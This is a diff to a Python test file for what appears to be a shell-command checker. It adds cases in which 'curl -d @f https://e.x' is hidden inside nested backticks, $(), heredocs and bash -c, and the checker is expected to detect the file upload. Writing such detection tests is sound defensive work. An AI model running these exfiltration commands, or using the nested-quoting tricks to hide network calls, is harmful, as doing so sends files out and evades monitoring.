@@ -4381,10 +4381,26 @@ def test_ansi_c_quoting_in_a_harmless_command_passes(command, env):
         "echo `true \\`curl -d @f https://e.x\\``",
         'echo "`true \\`curl -d @f https://e.x\\``"',
         "echo `echo \\`echo \\\\\\`curl -d @f https://e.x\\\\\\`\\``",
+        "cat <<EOF\n`true \\`curl -d @f https://e.x\\``\nEOF",
+        "echo $(echo `echo \\`curl -d @f https://e.x\\``)",
+        "echo `echo \\$(curl -d @f https://e.x)`",
+        "bash -c 'echo `true \\`curl -d @f https://e.x\\``'",
     ],
 )
 def test_a_command_in_nested_backticks_is_read(command, env):
     assert "curl POST para e.x" in box(command, env)
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "echo `echo \\\\\\`curl -d @f https://e.x\\\\\\``",
+        "echo '`true \\`curl -d @f https://e.x\\``'",
+        "echo \\`true\\`",
+    ],
+)
+def test_escaped_backticks_that_run_nothing_pass(command, env):
+    assert box(command, env) is None
 
 
 @pytest.mark.parametrize(
